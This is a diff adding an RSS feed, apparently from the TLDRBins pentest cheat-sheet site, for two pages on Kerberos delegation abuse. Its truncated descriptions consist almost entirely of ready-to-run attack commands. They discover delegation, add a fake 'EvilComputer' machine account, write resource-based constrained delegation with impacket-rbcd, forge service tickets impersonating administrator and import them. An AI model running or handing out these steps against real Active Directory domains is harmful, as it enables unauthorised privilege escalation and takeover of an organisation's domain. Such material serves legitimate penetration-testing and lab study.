@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Rbcd on TLDRBins</title>
+    <link>https://tldrbins.github.io/@rbcd/</link>
+    <description>Recent content in Rbcd on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@rbcd/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k Check forwardable flag impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check flags describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 example.com/username:password 2. Rbcd attack impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from EvilComputer$ -dc-ip dc.example.com -action &amp;#39;write&amp;#39; example.com/username:password 3. Impersonate sudo ntpdate -s dc.example.com &amp;amp;&amp;amp; impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip dc.example.com &amp;#39;example.com/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_dc.example.com@example.com.ccache 5. Post-Attack # Remote sudo ntpdate -s dc.</description>
+    </item>
+  </channel>
+</rss>
